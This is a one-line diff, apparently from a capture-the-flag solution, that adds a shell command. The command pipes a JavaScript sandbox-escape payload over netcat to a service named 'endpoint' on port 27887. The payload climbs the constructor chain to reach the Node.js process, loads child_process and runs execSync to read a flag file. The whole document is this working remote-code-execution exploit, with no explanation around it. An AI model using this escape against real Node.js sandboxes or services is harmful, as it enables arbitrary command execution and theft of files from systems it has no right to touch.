@@ -1,0 +1,1 @@
+echo "console.log(env.get('constructor')().process.mainModule.require('child_process').execSync('cat ./flag').toString())" | nc endpoint 27887
